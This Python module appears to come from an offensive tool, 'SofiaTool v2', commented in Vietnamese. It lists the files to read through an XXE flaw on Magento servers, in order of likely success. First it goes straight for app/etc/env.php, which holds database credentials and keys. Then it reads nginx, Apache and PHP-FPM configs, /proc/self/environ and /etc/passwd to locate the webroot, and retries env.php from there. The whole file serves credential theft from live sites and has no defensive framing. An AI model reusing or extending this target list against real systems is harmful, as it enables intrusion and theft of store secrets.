"""SofiaTool v2 — danh sách đường dẫn thử theo thứ tự (PHA 4b).

Chiến lược (ưu tiên theo "xác suất trúng / chi phí request"):
  Tầng 1 — DEFAULT_CANDIDATES: path env.php thử trực tiếp.
      Đầu tiên là các dạng cwd-relative (PHP-FPM chạy với cwd = webroot,
      hoặc docroot = pub/ nên cần ../), sau đó absolute path phổ biến.
  Tầng 2 — CONFIG_CANDIDATES: config server đọc qua XXE để TRÍCH webroot.
      Thứ tự theo giá trị thông tin mỗi request:
        nginx.conf          — xác nhận platform, include dirs
        /proc/self/environ  — SCRIPT_FILENAME/PWD = webroot chính xác
        /proc/self/cmdline  — pool name php-fpm
        /proc/self/mountinfo— mount point (Bitnami /bitnami/magento, docker volume)
        vhost nginx         — root directive
        /etc/passwd         — mở khóa /home/<user>/* (cPanel/shared hosting)
        apache confs        — DocumentRoot (kể cả cPanel httpd.conf)
        php-fpm pool.d      — chdir
  Sau đó config_hunter đẩy thêm <root>/app/etc/env.php từ config thật.
"""
# ---------------------------------------------------------------------------
# Tầng 1 — env.php thử trực tiếp (thứ tự = xác suất trúng giảm dần)
# ---------------------------------------------------------------------------
DEFAULT_CANDIDATES = [
    "/var/www/magento/app/etc/env.php",          # hit thật từ stack trace PHP-FPM
    "../app/etc/env.php",                        # cwd PHP-FPM = Magento root
    "/proc/self/cwd/app/etc/env.php",            # symlink kernel -> cwd thật
    "app/etc/env.php",                           # cwd = docroot = root (chdir '/')
    "../../app/etc/env.php",                     # docroot sâu hơn 1 cấp (pub/ hoặc subdir)
    "/var/www/html/app/etc/env.php",             # nginx/apache default docroot
    "/opt/bitnami/magento/app/etc/env.php",      # Bitnami (dev/test phổ biến nhất)
    "/home/bitnami/apps/magento/htdocs/app/etc/env.php",  # Bitnami trên AWS/CloudFormation
    "/var/www/app/etc/env.php",
    "/var/www/magento2/app/etc/env.php",
    "/usr/share/nginx/html/app/etc/env.php",     # nginx default (RHEL/CentOS)
]

# ---------------------------------------------------------------------------
# Tầng 2 — config để TRÍCH webroot (thứ tự theo giá trị thông tin/request)
# ---------------------------------------------------------------------------
NGINX_CONFS = [
    "/etc/nginx/nginx.conf",                     # luôn tồn tại nếu là nginx
    "/etc/nginx/sites-enabled/default",          # Debian/Ubuntu vhost mặc định
    "/etc/nginx/sites-enabled/default.conf",
    "/etc/nginx/sites-enabled/magento",
    "/etc/nginx/sites-enabled/magento.conf",
    "/etc/nginx/sites-enabled/magento2.conf",
    "/etc/nginx/conf.d/default.conf",            # RHEL/CentOS quen dùng conf.d
    "/etc/nginx/conf.d/magento.conf",
    "/etc/nginx/conf.d/magento2.conf",
    "/etc/nginx/sites-available/default",        # dự phòng khi không có symlink
    "/etc/nginx/sites-available/magento.conf",
    "/etc/nginx/sites-available/magento2.conf",
]

APACHE_CONFS = [
    "/etc/apache2/apache2.conf",
    "/etc/apache2/sites-enabled/000-default.conf",  # Debian/Ubuntu
    "/etc/apache2/sites-enabled/default.conf",
    "/etc/apache2/sites-enabled/magento.conf",
    "/etc/apache2/sites-enabled/magento2.conf",
    "/etc/apache2/sites-available/000-default.conf",
    "/etc/apache2/sites-available/magento.conf",
    "/etc/httpd/conf/httpd.conf",                # RHEL/CentOS
    "/etc/httpd/conf.d/vhost.conf",
    "/usr/local/apache/conf/httpd.conf",         # cPanel — DocumentRoot hàng loạt
]

# PHP-FPM: pool có thể đặt chdir = webroot. Bản version-agnostic (RHEL) đặt
# trước, sau đó đến per-version theo thứ tự đời mới -> cũ.
PHP_VERSIONS = ("8.3", "8.2", "8.1", "8.0", "7.4", "7.3", "7.2", "7.1", "7.0", "5.6")
POOL_NAMES = ("www", "magento", "magento2", "default")
PHPFPM_POOLS = [
    "/etc/php-fpm.d/www.conf",                   # RHEL/CentOS, không theo version
    *[f"/etc/php/{v}/fpm/pool.d/{n}.conf"
      for v in PHP_VERSIONS for n in POOL_NAMES],
    "/etc/php-fpm.d/magento.conf",
    "/etc/php-fpm.d/magento2.conf",
    "/etc/php5/fpm/pool.d/www.conf",
]

# /proc: rẻ, tỷ lệ trúng cao — đọc sớm.
PROC_FILES = [
    "/proc/self/environ",        # SCRIPT_FILENAME / PWD / DOCUMENT_ROOT -> webroot
    "/proc/self/cmdline",        # "php-fpm: pool www" -> pool name
    "/proc/self/mountinfo",      # mount point -> /bitnami/magento, docker volume
]

# Cơ sở dữ liệu user — mở khóa /home/<user>/* trên shared hosting (cPanel...).
USER_DB_FILES = [
    "/etc/passwd",
]

CONFIG_CANDIDATES = (
    NGINX_CONFS[:1]          # nginx.conf — xác nhận platform (1 request)
    + PROC_FILES             # environ/cmdline/mountinfo — trúng cao, không đoán
    + NGINX_CONFS[1:]        # vhost nginx — root directive
    + USER_DB_FILES          # passwd — sinh /home/<user>/{public_html,www,htdocs}
    + APACHE_CONFS
    + PHPFPM_POOLS
)

